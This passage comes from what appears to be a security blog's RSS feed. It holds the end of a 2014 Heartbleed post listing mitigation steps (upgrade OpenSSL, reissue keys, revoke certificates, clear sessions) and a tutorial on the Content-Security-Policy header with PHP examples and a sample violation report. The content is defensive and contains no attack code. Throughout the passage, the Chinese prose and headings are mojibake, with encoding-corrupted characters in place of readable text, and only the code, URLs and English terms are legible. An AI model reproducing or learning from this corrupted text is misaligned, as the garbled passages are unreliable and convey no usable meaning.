  &lt;li&gt;Êõ¥Êñ∞ OpenSSL Ëá≥ 1.0.1g Êàñ 1.0.2-beta2&lt;/li&gt;
  &lt;li&gt;ÈáçÈñãÊâÄÊúâËàá OpenSSL ÂáΩÂºèÂ∫´Áõ∏Èóú‰πãÊúçÂãô&lt;/li&gt;
  &lt;li&gt;ÈáçÊñ∞Áî¢Áîü SSL Private Key (Âõ†ÁÇ∫ Private Key ÂèØËÉΩËóâÁî±ÊºèÊ¥ûÂ§ñÊ¥©)&lt;/li&gt;
  &lt;li&gt;Â∞áÁ∂≤Á´ôËàäÊÜëË≠âÊí§Èä∑&lt;/li&gt;
  &lt;li&gt;Ê∏ÖÈô§ÊâÄÊúâÁõÆÂâçÁ∂≤È†Å‰º∫ÊúçÂô®‰∏äÁöÑ Session ÔºàÂõ†ÁÇ∫ÂèØËÉΩÈÅ≠Âà∞Á´äÂèñÔºâ&lt;/li&gt;
  &lt;li&gt;ÂøÖË¶ÅÊôÇÊõ¥ÊèõÁ∂≤Á´ôÂÖß‰ΩøÁî®ËÄÖÂØÜÁ¢ºÔºåÊàñÊòØÂØÜÂàáËøΩËπ§Á∂≤Á´ôÊòØÂê¶ÊúâÂ∏≥ËôüÁõúÁî®ÁöÑÊÉÖÊ≥ÅÁôºÁîü&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Ë©≥Á¥∞Ë®éË´ñËàáÂª∫Ë≠∞ÂèØ‰ª•ÂèÉËÄÉ
Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&quot;&gt;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;Ë™∞ÊúÉÊòØÁõÆÊ®ôÂë¢&quot;&gt;Ë™∞ÊúÉÊòØÁõÆÊ®ôÂë¢Ôºü&lt;/h3&gt;

&lt;p&gt;ÁúüÁöÑÊúÉÊúâÊîªÊìäËÄÖÂà©Áî®ÈÄôÊ®£ÁöÑÊîªÊìäÊâãÊ≥ïÂóéÔºüÁõÆÂâçÂú®&lt;a href=&quot;http://wooyun.org&quot;&gt;ÁÉèÈõ≤ wooyun&lt;/a&gt;Âπ≥Âè∞‰∏äÂ∑≤Á∂ìÊªøÊªøÁöÑË≥áÂÆâÁ†îÁ©∂Âì°ÈñãÂßãÂõûÂ†±Á∂≤Á´ôÂê´Êúâ OpenSSL ÊºèÊ¥û„ÄÇ‰πüÊúâÈß≠ÂÆ¢Âú®ÂòóË©¶Êí∞ÂØ´Êõ¥ÊúâÊïàÁöÑÊîªÊìäÂà©Áî®Á®ãÂºèÔºåÊÉ≥Ë¶ÅËóâÊ≠§ÊääÂπ≥Â∏∏Êâì‰∏ç‰∏ã‰æÜÁöÑÁ∂≤Á´ô‰∏ÄËàâÊîªÈô∑„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊÄéÊ®£ÁöÑÁ´ôÂè∞ÊúÉÊòØÈáçÈªûÁõÆÊ®ôÂë¢ÔºüÂê´ÊúâÊúÉÂì°Ê©üÂà∂ÁöÑÁ∂≤Á´ôÁâπÂà•Â¶ÇÊ≠§Ôºå‰æãÂ¶Ç Web Mail„ÄÅÁ§æÁæ§Á∂≤Á´ôÁ≠âÁ≠â„ÄÇÂõ†Ê≠§‰∏çÂ∞ë‰ºÅÊ•≠Ë¶ÅÂ§öÊ≥®ÊÑè‰∫ÜÔºå‰æãÂ¶ÇÂÖ®‰∏ñÁïåÊúÄÂ§ßÁöÑÁ§æÁæ§Á∂≤Á´ô Facebook„ÄÅSlideShare„ÄÅÂè∞ÁÅ£Áü•ÂêçÈõª‰ø°ÂÖ¨Âè∏Á∂≤Á´ô„ÄÅÁ§æ‰∫§Âπ≥Âè∞„ÄÅÁ∂≤Ë∑ØÈäÄË°å„ÄÅNASÔºåÈÉΩÊúÉÂú®ÈÄôÊ≥¢ÁöÑÊîªÊìäÁØÑÂúç‰πãÂÖß„ÄÇÂ¶ÇÊûúÊ≤íÊúâÂÑòÈÄü‰øÆÂæ©ÔºåÁ≠âÂà∞Êõ¥ÊúâÊïàÁöÑÊîªÊìäÁ®ãÂºèÂá∫ÁèæÔºåÂ∞±ÁúüÁöÑÁ≠âËëóÂ§±Ë°Ä‰∫Ü„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Â∞èÁµê&quot;&gt;Â∞èÁµê&lt;/h3&gt;

&lt;p&gt;Â∞±ÈÄ£ OpenSSL ÈÄôÁ®ÆÊ≠∑Âè≤ÊÇ†‰πÖËÄå‰∏îÈáçË¶ÅÁöÑÂáΩÂºèÂ∫´ÔºåÈÉΩÂèØËÉΩÁäØÈÄôÁ®ÆÂü∫Êú¨ÁöÑ C Ë™ûË®ÄÁ®ãÂºèË®≠Ë®àÈåØË™§ÔºåËÄÅËàäÁöÑÁ®ãÂºèÁ¢º‰∏ÄÂÆöÊúâ‰∏çÂ∞ëÈô≥Âπ¥ÈÅ∫ÊØíÔºåÂ¶ÇÊûúÊ≤íÊúâÂæπÂ∫ïÊ∏ÖÊü•ÔºåÈ°û‰ººÁöÑÂøÉËáüÂô¥Ë°Ä‰∫ã‰ª∂ÊúÉ‰∏çÊñ∑‰∏äÊºî„ÄÇÂ§ßÂÆ∂Âø´ÈªûÊ≠¢Ë°ÄÂêßÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/</link>
                <guid>https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160</guid>
                <pubDate>Wed, 09 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Content-Security-Policy - HTTP Headers ÁöÑË≥áÂÆâË≠∞È°å (2)</title>
                <description>&lt;h3 id=&quot;content-security-policy&quot;&gt;Content-Security-Policy&lt;/h3&gt;

&lt;p&gt;ÈÇÑË®òÂæóÂú®‰∏ä‰∏ÄÁØá &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP headers ÁöÑË≥áÂÆâË≠∞È°å (1)&lt;/a&gt; ÊñáÁ´†‰∏≠ÔºåÊàëÂÄëÊèêÂà∞‰∫ÜÂ§öÁ®ÆË≥áÂÆâÁõ∏ÈóúÁöÑ HTTP headers ÂóéÔºüÊé•‰∏ã‰æÜÁöÑÂπæÁØáÊñáÁ´†ÊàëÂÄëÊúÉ‰ªãÁ¥πÂπæÂÄãÂ∞àÈñÄÂ∞ç‰ªò XSS ÁöÑ HTTP headersÔºåÈ¶ñÂÖàÂ∞±Áî± Content-Security-Policy ÊâìÈ†≠Èô£„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy&quot;&gt;Content-Security-Policy&lt;/a&gt;Ôºà‰ª•‰∏ãÁ∞°Á®± CSPÔºâÊòØÂæû 2010 Âπ¥Ë¢´ÊèêÂá∫‰æÜÁöÑ‰∏ÄÈ†Ö Web Ë¶èÊ†ºÔºå‰∏ªË¶ÅÁõÆÁöÑÊòØÁî®‰æÜÈò≤Ê≠¢ Cross-Site ScriptingÔºà‰ª•‰∏ãÁ∞°Á®± XSSÔºâË∑üÁ∂≤È†ÅÊ®£ÂºèÁΩÆÊèõÔºà‰æãÂ¶Ç&lt;a href=&quot;https://web.archive.org/web/20140321184408/http://udn.com:80/NEWS/NATIONAL/NAT5/8554327.shtml&quot;&gt;ÁßëÊäÄÈÉ®Ë¢´ÊÉ°Êêû&lt;/a&gt;Â∞±ÊòØ‰∏ÄÂÄãÊúÄÂ•ΩÁöÑ‰æãÂ≠êÔºâ„ÄÇÁ∂ìÈÅé‰∫îÂπ¥ÁôºÂ±ïÔºåCSP 1.0 Â∑≤Âæû W3C ÁöÑ TR (Technical Report) ËÆäÊàê &lt;a href=&quot;http://www.w3.org/TR/CSP/&quot;&gt;Candidate Recommendation&lt;/a&gt;ÔºåÊáâË©≤‰∏ç‰πÖÂ∞±ÊúÉÂ∞áÊàêÁÇ∫ W3C Êé®Ëñ¶Ê®ôÊ∫ñ„ÄÇÊñ∞ÁöÑ &lt;a href=&quot;http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html&quot;&gt;CSP 1.1&lt;/a&gt; Ââá‰ªçÂú®ËçâÊ°àÈöéÊÆµ„ÄÇ&lt;/p&gt;

&lt;p&gt;CSP ÂÆ∂ÊóèÈæêÂ§ßÔºåÁ∏ΩÂÖ±Êúâ‰∏âÂÄãÈ°ûÂà•ÔºåÂÖ≠ÂÄãÈ†ÖÁõÆÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Content-Security-Policy&lt;/li&gt;
  &lt;li&gt;Content-Security-Policy-Report-Only&lt;/li&gt;
  &lt;li&gt;X-Content-Security-Policy&lt;/li&gt;
  &lt;li&gt;X-Content-Security-Policy-Report-Only&lt;/li&gt;
  &lt;li&gt;X-WebKit-CSP&lt;/li&gt;
  &lt;li&gt;X-WebKit-CSP-Report-Only&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Âú® CSP ÁôºÂ±ïÂàùÊúüÔºå‰∏ªÊµÅÁÄèË¶ΩÂô®‰∏¶Êú™ÂÖ®ÈÉ®‰æùÁÖßÂêå‰∏ÄÊ®ôÊ∫ñ‰æÜÈñãÁôºÔºåÂõ†Ê≠§ÁôºÂ±ïÊàêÈÄô‰∏âÁ®ÆÈ°ûÂà•„ÄÇÁõÆÂâçÁî±Êñº CSP 1.0 Âç≥Â∞áÊàêÁÇ∫Ê®ôÊ∫ñÔºåÂ§ßÂ§öÊï∏ÁÄèË¶ΩÂô®Â∑≤ÊîØÊè¥ Content-Security-Policy ÈÄôÂÄãÈ°ûÂà•ÔºåÂõ†Ê≠§ÁãÄÊ≥ÅÂ∑≤ÈÄêÊº∏Êî∂ÊñÇ„ÄÇ‰∏ªÊµÅÁÄèË¶ΩÂô®ÁöÑÊîØÊè¥ÂàóË°®Â¶Ç‰∏ãÂúñÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-browser-support-list.png&quot; title=&quot;Content-Security-Policy ÁÄèË¶ΩÂô®ÊîØÊè¥ÂàóË°®&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-browser-support-list.png&quot; alt=&quot;Content-Security-Policy ÁÄèË¶ΩÂô®ÊîØÊè¥ÂàóË°®&quot; title=&quot;Content-Security-Policy ÁÄèË¶ΩÂô®ÊîØÊè¥ÂàóË°®&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÂæûÂàóË°®‰∏≠ÂèØÁúãÂà∞ÔºåÂè™Ë¶Å‰ΩøÁî® Content-Security-Policy Ëàá X-Content-Security-Policy Â∞±Â∑≤ÊúâÂæàÈ´òÁöÑË¶ÜËìãÁéáÔºåÈô§ÈùûË¶ÅÊîØÊè¥ Safari 6ÔºåÂê¶Ââá‰∏çÁî®ÁâπÊÑè‰ΩøÁî® X-WebKit-CSP„ÄÇÊõ¥Ë©≥Á¥∞ÁöÑÁÄèË¶ΩÂô®ÊîØÊè¥ÂàóË°®ÂèØÂèÉËÄÉ &lt;a href=&quot;http://caniuse.com/contentsecuritypolicy&quot;&gt;Can I use&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;csp-10-‰∏ªË¶Å‰ΩúÁî®&quot;&gt;CSP 1.0 ‰∏ªË¶Å‰ΩúÁî®&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ËºâÂÖ•‰æÜÊ∫êÁôΩÂêçÂñÆ&lt;/p&gt;

    &lt;p&gt;ÂÆ£Âëä‰∏ÄÁµÑÂèó‰ø°‰ªªÁöÑÁôΩÂêçÂñÆËàáË≥áÊ∫êÁ®ÆÈ°ûÔºàÂ¶Ç JavaScript, CSS, image Á≠âÁ≠âÔºâÔºå‰ΩøÁÄèË¶ΩÂô®Âè™ËÉΩÂæûÊ≠§ÁôΩÂêçÂñÆ‰∏≠ËºâÂÖ•Ë≥áÊ∫êÔºåËóâÊ≠§Èò≤Ê≠¢ÊîªÊìäËÄÖÂæûÂ§ñÈÉ®ÂºïÂÖ•Âê´ÊúâÊÉ°ÊÑèÁ®ãÂºèÁ¢ºÁöÑË≥áÊ∫ê„ÄÇ&lt;/p&gt;

    &lt;p&gt;‰æãÔºöContent-Security-Policy: default-src ‚Äòself‚Äô; script-src ‚Äòself‚Äô http://js.devco.re; style-src ‚Äòself‚Äô http://css.devco.re; img-src ‚Äòself‚Äô data:; frame-src ‚Äònone‚Äô&lt;/p&gt;

    &lt;p&gt;ÊïàÊûúÔºöÈôêÂÆö script Ë≥áÊ∫êÂè™ËÉΩÂæû http://js.devco.re ËºâÂÖ•ÔºõÈôêÂÆö style Ë≥áÊ∫êÂè™ËÉΩÂæû http://css.devco.re ËºâÂÖ•ÔºõÈôêÂÆö img Âè™ËÉΩÂæûÁõ∏Âêå domain ËºâÂÖ•Ôºå‰∏¶‰∏îÊîØÊè¥ data schemeÔºõÈôêÂÆö frame ‰∏çËÉΩÂæû‰ªª‰Ωï‰æÜÊ∫êËºâÂÖ•ÔºõÈô§‰∫Ü script„ÄÅstyle„ÄÅimg„ÄÅframe ‰πãÂ§ñÁöÑË≥áÊ∫êÔºåÂâáÂè™ËÉΩÂæûÂêåÊ®£ domain ‰ª•ÂèäÂêåÊ®£ÂçîÂÆöÁöÑ‰æÜÊ∫êËºâÂÖ•„ÄÇ&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Á¶ÅÊ≠¢ inline Á®ãÂºèÁ¢º&lt;/p&gt;

    &lt;p&gt;‰∏ÄËà¨‰∫∫ÈñãÁôºÁ∂≤Á´ôÊôÇÁÇ∫Ê±Ç‰æøÂà©ÔºåÁ∂ìÂ∏∏ÊúÉÂú® HTML ‰∏≠ÂØ´ÂÖ•‰∏Ä‰∫õ inline Á®ãÂºèÁ¢ºÔºå‰ΩÜÊîªÊìäËÄÖÊÑèÂúñÂÖ•‰æµÁ∂≤Á´ôÊôÇ‰πüÂ∏∏Áî®Ê≠§ÊâãÊ≥ï„ÄÇÁÑ∂ËÄåÁÄèË¶ΩÂô®ÂÖ∂ÂØ¶ÁÑ°Ê≥ïÂàÜËæ®ÈÄô‰∫õ inline Á®ãÂºèÁ¢ºÁ©∂Á´üÊòØÈñãÁôº‰∫∫Âì°ÂØ´ÁöÑÔºåÈÇÑÊòØÊîªÊìäËÄÖÊ§çÂÖ•ÁöÑ„ÄÇÂõ†Ê≠§ CSP ‰πæËÑÜÂº∑Ëø´ÈñãÁôºËÄÖÂøÖÈ†àÊääÊâÄÊúâ inline Á®ãÂºèÁ¢ºÁßªÂà∞Â§ñÈÉ®Ê™îÊ°àÔºåÂÆåÂÖ®ÊùúÁµïÂú® HTML ‰∏≠Âá∫Áèæ inline Á®ãÂºèÁ¢ºÁöÑÁãÄÊ≥Å„ÄÇÂõ†Ê≠§Èô§Èùû‰Ω†Âú® CSP ÂÆ£ÂëäÊôÇÊúâË®ªÊòé ‚Äòunsafe-inline‚ÄôÔºåÂê¶Ââá CSP È†êË®≠Á¶ÅÊ≠¢‰ΩøÁî® inline script Êàñ inline CSS„ÄÇ&lt;/p&gt;

    &lt;p&gt;‰æãÔºöContent-Security-Policy: default-src ‚Äòself‚Äô; script-src ‚Äòunsafe-inline‚Äô&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Á¶ÅÊ≠¢ eval ÂáΩÂºè&lt;/p&gt;

    &lt;p&gt;eval() Â∞çË®±Â§öÈñãÁôºËÄÖ‰æÜË™™‰∏ÄÁõ¥ÊòØÂÄãÈùûÂ∏∏Êñπ‰æøÁöÑÂáΩÂºèÔºåÁÑ∂ËÄåËã•Áº∫‰πèË≥áÂÆâËßÄÂøµÔºå‰ΩøÁî®Ê≠§ÂáΩÂºèÊôÇÂæàÂèØËÉΩÊúÉÂ∞éËá¥ÊΩõÂú®ÁöÑ XSS È¢®Èö™„ÄÇÂõ†Ê≠§Èô§Èùû‰Ω†Âú® CSP ÂÆ£ÂëäÊôÇÊúâË®ªÊòé ‚Äòunsafe-eval‚ÄôÔºåÂê¶Ââá CSP È†êË®≠Á¶ÅÊ≠¢‰ΩøÁî® eval() ÂáΩÂºè„ÄÇ&lt;/p&gt;

    &lt;p&gt;‰æãÔºöContent-Security-Policy: default-src ‚Äòself‚Äô; script-src ‚Äòunsafe-eval‚Äô&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Èò≤Ê≠¢ sniffer&lt;/p&gt;

    &lt;p&gt;Áî±Êñº CSP ÂèØÊåáÂÆöËºâÂÖ•Ë≥áÊ∫êÊôÇÂº∑Âà∂‰ΩøÁî® https ÂçîÂÆöÔºåÂõ†Ê≠§ÂèØÈôç‰ΩéË¢´ sniffing ÁöÑÊ©üÁéá„ÄÇ&lt;/p&gt;

    &lt;p&gt;‰æãÔºöContent-Security-Policy: default-src http://devco.re; img-src https:&lt;/p&gt;

    &lt;p&gt;ÊïàÊûúÔºöÈôêÂÆöÂúñÁâáÂè™ËÉΩÂæû https ÂçîÂÆöËºâÂÖ•Ôºå‰∏çÈôêÂÆö domain„ÄÇËÄåÈô§‰∫ÜÂúñÁâá‰πãÂ§ñÁöÑË≥áÊ∫êÂâáÂèØÂæû‰ªªÊÑè‰æÜÊ∫êËºâÂÖ•„ÄÇ&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;csp-demo&quot;&gt;CSP Demo&lt;/h3&gt;

&lt;p&gt;‰∏ãÈù¢ÈÄô‰∏ÄÊÆµÁ®ãÂºèÁ¢ºÔºå‰ΩøÁî® default-src * ËÆìÁõ∏ÈóúË≥áÊ∫êÂèØÊ≠£Â∏∏È°ØÁ§∫Ôºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Security-Policy: default-src *&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CSP Demo Site&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Content Security Policy Demo Site&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;200&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;200&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://devco.re/assets/themes/devcore/images/double-sticker.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/img&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;frameborder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;300&apos;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;200&apos;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;http://www.youtube.com/embed/E-BGf1MwecU&apos;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-1.png&quot; title=&quot;‰ΩøÁî®ÊúÄÂØ¨È¨ÜÁöÑ Content-Security-Policy Ë¶èÂâá&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-1.png&quot; alt=&quot;‰ΩøÁî®ÊúÄÂØ¨È¨ÜÁöÑ Content-Security-Policy Ë¶èÂâá&quot; title=&quot;‰ΩøÁî®ÊúÄÂØ¨È¨ÜÁöÑ Content-Security-Policy Ë¶èÂâá&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Êé•‰∏ã‰æÜÊàëÂÄëÂ∞á php header ÁöÑÈÇ£‰∏ÄË°åÁ®ãÂºèÁ¢º‰øÆÊîπÂ¶Ç‰∏ã‰∏¶‰∏î reload ÁÄèË¶ΩÂô®È†ÅÈù¢Ôºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Security-Policy: default-src *; img-src https:; frame-src &apos;none&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-2.png&quot; title=&quot;‰ΩøÁî® Content-Security-Policy ÈôêÂà∂ img Ëàá frame ÁöÑ‰æÜÊ∫ê&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-2.png&quot; alt=&quot;‰ΩøÁî® Content-Security-Policy ÈôêÂà∂ img Ëàá frame ÁöÑ‰æÜÊ∫ê&quot; title=&quot;‰ΩøÁî® Content-Security-Policy ÈôêÂà∂ img Ëàá frame ÁöÑ‰æÜÊ∫ê&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;‰ΩøÁî® CSP ÈôêÂà∂ img Ëàá frame ÁöÑ‰æÜÊ∫êÁ®ÆÈ°ûÂæåÔºåÊàëÂÄëÂèØ‰ª•Âæû‰∏äÂúñ Chrome Inspector ÁöÑÁ¥ÖÂ≠óËßÄÂØüÂà∞ÔºåÁ∂≤Á´ôÁöÑÂúñÁâáËàá iframe ÂΩ±ÁâáÂ∑≤Ë¢´ÁÄèË¶ΩÂô®ÊìãÊéâÔºåÁÑ°Ê≥ïËºâÂÖ•„ÄÇ&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúÊìîÂøÉÁõ¥Êé•‰ΩøÁî® CSP ÊúÉÂΩ±ÈüøÁ∂≤Á´ôÁáüÈÅãÔºå‰ΩÜÂèàÊÉ≥ÂòóË©¶ CSPÔºåÂèØ‰ª•ÂÖà‰ΩøÁî® Content-Security-Policy-Report-OnlyÔºåÁ§∫ÁØÑÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Security-Policy-Report-Only: default-src *; img-src https:; frame-src &apos;none&apos;; report-uri http://devco.re/demo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-report-only.png&quot; title=&quot;Content-Security-Policy-Report-Only&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-report-only.png&quot; alt=&quot;Content-Security-Policy-Report-Only&quot; title=&quot;Content-Security-Policy-Report-Only&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Áî±‰∏äÂúñÂèØ‰ª•ÁúãÂà∞ÔºåÊ≠§ header ‰∏çÊúÉÁõ¥Êé•ÈòªÊìã‰∏çÁ¨¶Âêà CSP Ë¶èÁØÑÁöÑË≥áÊ∫êÔºå‰ΩÜÊòØÊúÉÊ†πÊìö‰ΩøÁî®ËÄÖÊâÄÈÅïÂèçÁöÑË¶èÂâáÁôºÈÄÅÁõ∏Â∞çÊáâÁöÑ POST request Ëá≥ÊåáÂÆöÁöÑ URIÔºåÁôºÈÄÅÂÖßÂÆπÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;csp-report&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;blocked-uri&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://devco.re/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;document-uri&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://yoursite.com/csp.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;original-policy&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;default-src *; img-src https:; frame-src &apos;none&apos;; report-uri http://devco.re/demo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;referrer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;status-code&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;violated-directive&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;img-src https:&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

